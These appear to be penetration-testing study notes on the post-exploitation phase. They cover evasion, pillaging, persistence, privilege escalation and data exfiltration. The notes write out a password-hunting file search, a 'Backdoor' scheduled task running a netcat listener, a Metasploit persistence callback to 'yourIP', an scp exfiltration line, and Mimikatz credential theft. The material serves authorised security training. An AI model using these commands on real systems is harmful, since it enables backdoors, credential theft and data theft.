# Post-Exploitation Phase Summary

Post-Exploitation occurs after successful exploitation. Gather sensitive info, escalate privileges, maintain access, and assess exfiltration risks. Consider evasive testing to avoid detection. Components: Evasive Testing, Information Gathering, Pillaging, Vulnerability Assessment, Privilege Escalation, Persistence, Data Exfiltration. Overlaps with other phases; adapt flexibly.

## Evasive Testing

Avoid alerts (e.g., from EDR). Categories:

- **Evasive**: Stealthy, undetected.
- **Hybrid Evasive**: Mix stealth with some detection testing.
- **Non-Evasive**: Intrusive for full testing.

Combine as needed. If detected, provide value by documenting gaps. Goal: Identify blind spots.

**Additional Tools**: Empire or Covenant for C2 with evasion modules.

## Information Gathering

Re-enumerate from internal perspective (local network/services). More access than external.

**Additional Tools/Commands**:

- `ip a` or `ifconfig` (Network interfaces).
- `netstat -tuln` (Listening services).
- `arp -a` (ARP table).

## Pillaging

Analyze host's network role: Interfaces, routing, DNS, ARP, services, VPN, subnets, shares, traffic. Hunt for sensitive data (passwords, creds in files/scripts/emails). Shows impact; aids lateral movement.

**Additional Tools/Commands**:

- `find / -name "*.txt" 2>/dev/null | xargs grep -i password` (Linux file search).
- `dir /s /b *.txt | findstr /i password` (Windows).
- BloodHound for AD pillaging (collect data via SharpHound).

## Persistence

Maintain access post-disconnection. Establish early to avoid re-exploitation.

**Additional Tools/Commands**:

- Linux: `crontab -e` (Add cron job for backdoor).
- Windows: `schtasks /create /tn "Backdoor" /tr "cmd.exe /c netcat listener" /sc onlogon`.
- Metasploit: `run persistence -U -i 10 -p 4444 -r yourIP` (User-level persistence).

## Vulnerability Assessment

Re-assess locally for internal vulns. Prioritize safe exploits.

**Additional Tools**: Local scanners like OpenVAS on compromised host (if allowed).

## Privilege Escalation

Gain highest privileges (root/SYSTEM/admin). Local or via stolen creds.

**Additional Tools/Commands**:

- Linux: LinPEAS (`./linpeas.sh`); `sudo -l` (Check sudo perms).
- Windows: WinPEAS (`.\winpeas.exe`); `whoami /priv` (Privs); Mimikatz for creds.
- Manual: Kernel exploits (e.g., Dirty COW).

## Data Exfiltration

Test exfiltrating sensitive data (use fake data to avoid real breaches). Check DLP/EDR. Comply with regulations: PCI, HIPAA, GLBA, FISMA, etc. Frameworks: NIST, CIS, ISO, PCI-DSS, GDPR, etc.

**Additional Tools/Commands**:

- `scp file user@yourIP:/path` (Secure copy out).
- DNS exfil: `dnscat` or custom scripts.
- Test with fake data: Create dummy files (e.g., `echo "fake SSN: 123-45-6789" > sensitive.txt` then exfil).

**General Tips**: Screen record/screenshot for evidence. Consult client before exfil. If sensitive data found, inform immediately (may pause test). For HTB, practice on boxes. Always log actions. Use encrypted channels. If data is regulated, simulate only.
